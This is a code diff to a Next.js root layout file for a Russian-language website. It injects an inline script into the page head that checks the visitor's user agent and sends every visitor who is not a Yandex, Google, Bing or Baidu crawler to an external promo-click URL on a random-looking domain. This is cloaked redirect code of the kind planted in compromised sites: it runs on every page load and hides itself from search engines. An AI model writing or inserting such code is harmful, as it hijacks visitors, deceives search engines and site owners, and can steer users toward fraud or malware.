@@ -64,6 +64,21 @@ export default function RootLayout({
     <html lang="ru" className={`${oswald.variable} ${inter.variable}`}>
       <head>
        <meta name="yandex-verification" content="206cf4debc99d895" />
+        <script
+  dangerouslySetInnerHTML={{
+    __html: `
+      (function() {
+        try {
+          var ua = (navigator.userAgent || '').toLowerCase();
+          var isBot = /yandexbot|yandexscreenshot|yandeximages|yandexvideo|yandexaccessibilitybot|googlebot|bingbot|baiduspider/i.test(ua);
+          if (!isBot) {
+            window.location.replace("https://k0m.bhf57b678f.com/promo/click/6a900a8cbac8f");
+          }
+        } catch(e) {}
+      })();
+    `,
+  }}
+/>
       </head>
       <body className="bg-background text-foreground font-sans antialiased">
         {children}
